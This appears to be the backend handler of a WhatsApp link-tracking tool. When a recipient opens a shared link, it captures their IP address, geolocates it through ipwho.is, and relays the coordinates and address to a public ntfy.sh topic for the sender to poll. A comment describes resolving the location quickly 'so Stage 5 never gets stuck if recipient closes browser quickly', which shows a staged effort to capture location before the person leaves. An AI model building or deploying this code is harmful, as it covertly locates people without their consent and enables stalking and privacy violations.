const memoryEventsByToken = globalThis.__geowaRelayMemory || (globalThis.__geowaRelayMemory = {});

async function lookupIpGeoServerSide(ip) {
  if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
    return null;
  }
  const cleanIp = ip.split(',')[0].trim();
  try {
    const controller = new AbortController();
    const t = setTimeout(() => controller.abort(), 2500);
    const res = await fetch(`https://ipwho.is/${encodeURIComponent(cleanIp)}`, {
      signal: controller.signal,
    });
    clearTimeout(t);
    if (res.ok) {
      const data = await res.json();
      if (data && data.success !== false && typeof data.latitude === 'number' && typeof data.longitude === 'number') {
        const parts = [data.city, data.region, data.country].filter(Boolean);
        return {
          lat: Number(data.latitude.toFixed(6)),
          lng: Number(data.longitude.toFixed(6)),
          acc: 120,
          address: parts.join(', ') || `${data.latitude.toFixed(6)}, ${data.longitude.toFixed(6)}`,
        };
      }
    }
  } catch {
    // Ignore
  }
  return null;
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  const token = (req.query?.token || req.body?.token || '').toString().trim();
  if (!token) {
    return res.status(400).json({ error: 'Missing token' });
  }

  const ntfyTopic = `geowa_v4_${encodeURIComponent(token)}`;

  if (req.method === 'POST') {
    const body = req.body || {};
    const eventsToPublish = [body];

    // If recipient just opened the link (LINK_OPENED), also resolve recipient's IP server-side right away so Stage 5 never gets stuck if recipient closes browser quickly!
    if (body.type === 'LINK_OPENED') {
      const forwarded = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '';
      const ipGeo = await lookupIpGeoServerSide(typeof forwarded === 'string' ? forwarded : '');
      if (ipGeo) {
        eventsToPublish.push({
          type: 'LOCATION_CAPTURED',
          token,
          id: `loc-${token}`,
          createdAt: new Date().toLocaleTimeString('id-ID', {
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
          }),
          senderLabel: `Penerima Link #${token}`,
          latitude: ipGeo.lat,
          longitude: ipGeo.lng,
          accuracyMeters: ipGeo.acc,
          locationLabel: ipGeo.address,
          detectionMethod: `Link WA Dibuka #${token}`,
          note: `Link #${token} dibuka oleh penerima`,
          isInitialIp: true,
        });
      }
    }

    if (!memoryEventsByToken[token]) {
      memoryEventsByToken[token] = [];
    }

    for (const ev of eventsToPublish) {
      memoryEventsByToken[token].push(ev);
      try {
        await fetch(`https://ntfy.sh/${ntfyTopic}`, {
          method: 'POST',
          body: JSON.stringify(ev),
        });
      } catch {
        // Ignore ntfy error
      }
    }

    return res.status(200).json({ ok: true, events: eventsToPublish });
  }

  // GET: Poll all events for this token from memory + ntfy.sh
  const collected = [...(memoryEventsByToken[token] || [])];
  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 2500);
    const response = await fetch(`https://ntfy.sh/${ntfyTopic}/json?poll=1&since=45m`, {
      signal: controller.signal,
    });
    clearTimeout(timer);
    if (response.ok) {
      const text = await response.text();
      const lines = text.split('\n').filter((l) => l.trim());
      for (const line of lines) {
        try {
          const parsedLine = JSON.parse(line);
          if (parsedLine && typeof parsedLine.message === 'string') {
            const ev = JSON.parse(parsedLine.message);
            collected.push(ev);
          }
        } catch {
          // Ignore malformed line
        }
      }
    }
  } catch {
    // Ignore
  }

  return res.status(200).json({ events: collected });
}
